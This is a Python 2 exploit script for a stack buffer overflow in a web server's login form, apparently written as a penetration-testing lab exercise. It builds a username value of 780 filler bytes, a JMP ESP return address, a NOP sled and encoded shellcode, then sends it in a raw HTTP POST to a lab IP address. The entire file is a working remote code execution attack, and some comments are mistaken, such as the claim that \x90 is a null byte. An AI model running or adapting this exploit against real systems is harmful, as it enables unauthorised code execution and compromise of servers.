import socket

#"\x00\x0a\x0d\x25\x26\x2b\3d"
#log data, item 3
#Address from mona = 0x10090c83 (jmp ESP point): "\xff\xe4"
# in memory (littel indian)= "\x83\x0c\x09\x10"

shell=""
shell+="\xdb\xc5\xbd\x58\xf2\xbe\xc5\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
shell+="\x52\x31\x6f\x17\x03\x6f\x17\x83\x9f\xf6\x5c\x30\xe3\x1f\x22"
shell+="\xbb\x1b\xe0\x43\x35\xfe\xd1\x43\x21\x8b\x42\x74\x21\xd9\x6e"
shell+="\xff\x67\xc9\xe5\x8d\xaf\xfe\x4e\x3b\x96\x31\x4e\x10\xea\x50"
shell+="\xcc\x6b\x3f\xb2\xed\xa3\x32\xb3\x2a\xd9\xbf\xe1\xe3\x95\x12"
shell+="\x15\x87\xe0\xae\x9e\xdb\xe5\xb6\x43\xab\x04\x96\xd2\xa7\x5e"
shell+="\x38\xd5\x64\xeb\x71\xcd\x69\xd6\xc8\x66\x59\xac\xca\xae\x93"
shell+="\x4d\x60\x8f\x1b\xbc\x78\xc8\x9c\x5f\x0f\x20\xdf\xe2\x08\xf7"
shell+="\x9d\x38\x9c\xe3\x06\xca\x06\xcf\xb7\x1f\xd0\x84\xb4\xd4\x96"
shell+="\xc2\xd8\xeb\x7b\x79\xe4\x60\x7a\xad\x6c\x32\x59\x69\x34\xe0"
shell+="\xc0\x28\x90\x47\xfc\x2a\x7b\x37\x58\x21\x96\x2c\xd1\x68\xff"
shell+="\x81\xd8\x92\xff\x8d\x6b\xe1\xcd\x12\xc0\x6d\x7e\xda\xce\x6a"
shell+="\x81\xf1\xb7\xe4\x7c\xfa\xc7\x2d\xbb\xae\x97\x45\x6a\xcf\x73"
shell+="\x95\x93\x1a\xd3\xc5\x3b\xf5\x94\xb5\xfb\xa5\x7c\xdf\xf3\x9a"
shell+="\x9d\xe0\xd9\xb2\x34\x1b\x8a\x7c\x60\x81\x4b\x15\x73\xc5\x5a"
shell+="\xb9\xfa\x23\x36\x51\xab\xfc\xaf\xc8\xf6\x76\x51\x14\x2d\xf3"
shell+="\x51\x9e\xc2\x04\x1f\x57\xae\x16\xc8\x97\xe5\x44\x5f\xa7\xd3"
shell+="\xe0\x03\x3a\xb8\xf0\x4a\x27\x17\xa7\x1b\x99\x6e\x2d\xb6\x80"
shell+="\xd8\x53\x4b\x54\x22\xd7\x90\xa5\xad\xd6\x55\x91\x89\xc8\xa3"
shell+="\x1a\x96\xbc\x7b\x4d\x40\x6a\x3a\x27\x22\xc4\x94\x94\xec\x80"
shell+="\x61\xd7\x2e\xd6\x6d\x32\xd9\x36\xdf\xeb\x9c\x49\xd0\x7b\x29"
shell+="\x32\x0c\x1c\xd6\xe9\x94\x3c\x35\x3b\xe1\xd4\xe0\xae\x48\xb9"
shell+="\x12\x05\x8e\xc4\x90\xaf\x6f\x33\x88\xda\x6a\x7f\x0e\x37\x07"
shell+="\x10\xfb\x37\xb4\x11\x2e"

buf="A"*780+"\x83\x0c\x09\x10"+'\x90'*20+shell+'\x90'*(1500-22-len(shell))

#\x90 is null byte
#1500 to check how the buffer will bear

payload="username="+buf+"&password=Pass"
buffer =""
buffer += "POST /login HTTP/1.1\r\n"
buffer += "Host: 192.168.162.130\r\n"
buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
buffer += "Accept-Language: en-US,en;q=0.5\r\n"
buffer += "Referer: http://10.11.0.22/login\r\n"
buffer += "Connection: close\r\n"
buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
buffer += "Content-Length: "+str(len(payload))+"\r\n"
buffer += "\r\n"
buffer +=payload

print buffer

s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.162.130",80))
s.send(buffer)
print s.recv(1024)
s.close() 
